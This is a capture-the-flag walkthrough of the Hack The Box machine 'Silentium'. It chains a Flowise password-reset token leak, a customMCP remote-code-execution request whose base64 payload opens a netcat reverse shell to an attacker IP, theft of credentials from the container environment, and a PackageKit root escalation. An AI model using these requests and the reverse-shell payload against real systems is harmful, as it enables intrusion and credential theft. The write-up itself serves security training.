<div class="machine-header" markdown>
<img src="../images/silentium/machine-icon.png" alt="machine-icon" class="machine-icon" />
<div class="machine-title" markdown>
<h1>Silentium</h1>
<p class="machine-tags" markdown>:lucide-bird: Linux &nbsp;&nbsp; :lucide-bar-chart-3: Easy</p>
</div>
</div>
## Reconnaissance & Initial Enumeration

Start with an initial reachability test and port scan against the target IP (`10.129.245.103`).

```bash
ping 10.129.245.103
```

Next, run a full TCP port scan using `nmap`:

```bash
sudo nmap -p- --min-rate 1000 10.129.245.103
```

**Port Scan Results:**

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

With port 80 open, add the hostname mapping to `/etc/hosts`:

```bash
echo "10.129.245.103 silentium.htb" | sudo tee -a /etc/hosts
```

![1](../images/silentium/1.png)

!!! info "Target User Enumeration"

    Names identified from initial OSINT and web enumeration:

    - Marcus Thorne
    - Ben
    - Elena Rossi

### Directory & Subdomain Fuzzing

Perform directory fuzzing on the primary domain:

```bash
ffuf -u http://silentium.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 8753
```

Output:

```text
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 410ms]
```

Next, proceed with Virtual Host (vhost) enumeration:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://silentium.htb -H "host: FUZZ.silentium.htb" -fs 178
```

Output:

```text
staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 609ms]
```

![2](../images/silentium/2.png)

### API Endpoint Discovery

Fuzz `staging.silentium.htb` specifically against API routes:

```bash
ffuf -u http://staging.silentium.htb/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 31
```

**Discovered API Endpoints:**

```text
attachments             [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 428ms]
feedback_js             [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 562ms]
ip                      [Status: 200, Size: 518, Words: 66, Lines: 1, Duration: 442ms]
ipod                    [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 497ms]
ipdata                  [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 499ms]
ipn                     [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 501ms]
iphone                  [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 501ms]
ipp                     [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 512ms]
ipc                     [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 512ms]
ips                     [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 524ms]
ips_kernel              [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 409ms]
ping                    [Status: 200, Size: 4, Words: 1, Lines: 1, Duration: 614ms]
pingback                [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 614ms]
pricing                 [Status: 200, Size: 1258, Words: 64, Lines: 1, Duration: 408ms]
version                 [Status: 200, Size: 19, Words: 1, Lines: 1, Duration: 406ms]
version.json            [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 406ms]
```

Check the application version:

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

Response:

```json
{"version":"3.0.5"}
```

![3](../images/silentium/3.png)

---

## Exploitation & Initial Access

![4](../images/silentium/4.png)

### Password Reset Flaw (CVE-2025-58434)

Analyzing the application against known vulnerabilities for this version reveals [CVE-2025-58434](https://github.com/advisories/GHSA-wgpv-6j63-x5ph). Initiate a password reset request targeting user `ben@silentium.htb`:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' | jq
```

**Response:**

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$lpgJgNbw8nhWDadOamdTQeqjGg19HDVcWAyuvHqEKBtOyjAjM9Mui",
    "tempToken": "LLX18JCuuya5TkPlBjagv4Fksh5rWYDG8Y9D8He01qWoWaqlcBI1RZZ6pdATyRgO",
    "tokenExpiry": "2026-09-25T21:53:14.413Z",
    "status": "active",
    "createdDate": "2026-01-29T20:14:57.000Z",
    "updatedDate": "2026-09-25T21:38:14.000Z",
    "createdBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "updatedBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73"
  },
  "organization": {},
  "organizationUser": {},
  "workspace": {},
  "workspaceUser": {},
  "role": {}
}
```

Because the temporary password reset token (`tempToken`) is exposed directly in the API response, reset the password for `ben@silentium.htb`:

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user":{
      "email":"ben@silentium.htb",
      "tempToken":"vwHJrS3FDrMnXuk7piyq2fBAhmM28bE0xHnYNfRTrQumQLkceyg0x2lscnULla5Q",
      "password":"AdminUser@123!!"
    }
  }'
```

![5](../images/silentium/5.png)

![6](../images/silentium/6.png)

---

### Remote Code Execution in Flowise (CVE-2025-59528)

With authenticated access, target [CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) in Flowise to obtain remote code execution via `customMCP`:

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjI0OSA0NDQ0ID4vdG1wL2YK | base64 -d | sh\");return 1;})()})"
    }
  }'
```

Executing this payload returns a reverse shell as `root` inside the isolated Flowise Docker container.

---

## Container Internal Enumeration & SSH Pivot

??? info "Environment Variable Mechanics: `/proc/1/environ` vs `env`"

    - **`/proc/1/environ`**: Contains the environment variables as they were defined when PID 1 started inside the container (null-byte separated). It reflects the exact runtime conditions set at container initialization (`ENV` directives in Dockerfile). Readable by root/process owner.
    - **`env`**: Command displaying environment variables inherited by the current calling shell process (`execve()`). Variables modified or unset by intermediate processes won't show here.

Inspect `/proc/1/environ` inside the container:

```bash
cat /proc/1/environ
```

**Environment Variables Extracted:**

```text
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=1
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

Using the credential reused in the environment variables (`SMTP_PASSWORD=r04D!!_R4ge`), SSH into the host system directly as user `ben`:

```bash
ssh ben@silentium.htb
# Password: r04D!!_R4ge
```

---

## Privilege Escalation

??? info "Enumeration Strategy & Package Discovery"

    Running enumeration tools like LinPEAS highlights PackageKit and command-not-found system utilities. Extracting package details reveals package versions susceptible to local privilege escalation.

Linux enumeration with [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

![7](../images/silentium/7.png)

??? info "Understanding enumeration results"

    Targeting specific package caches and local database tables is effective because operational environments often leave saved credentials in non-standard file paths or browser profiles (e.g., Firefox extension storage), avoiding typical detection. You must also check the versions of the services running on the target and check if they are vulnerable.

Check package versions installed on the target:

```bash
ben@silentium:/tmp$ dpkg -l command-not-found packagekit fwupd
```

**Output:**

```text
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name              Version                 Architecture Description
+++-=================-=======================-============-=============================================================
ii  command-not-found 23.04.0                 all          Suggest installation of packages in interactive bash sessions
ii  fwupd             1.9.34-0ubuntu1~24.04.1 amd64        Firmware update daemon
ii  packagekit        1.2.8-2ubuntu1.4        amd64        Provides a package management service
```

### Exploiting PackageKit (Pack2TheRoot)

The installed version `PackageKit 1.2.8-2ubuntu1.4` is vulnerable to a TOCTOU race condition allowing local privilege escalation to root:

* Advisory: [GHSA-f55j-vvr9-69xv](https://github.com/PackageKit/PackageKit/security/advisories/GHSA-f55j-vvr9-69xv)
* Reference: [Pack2TheRoot LPE Analysis](https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html)

Execute the Pack2TheRoot exploit vector against PackageKit to achieve full `root` privilege escalation on `silentium.htb`.

![8](../images/silentium/8.png)

[Silentium Solve](https://labs.hackthebox.com/achievement/machine/2411080/867)

![[solve](https://labs.hackthebox.com/achievement/machine/2411080/867)](../images/silentium/solve.png)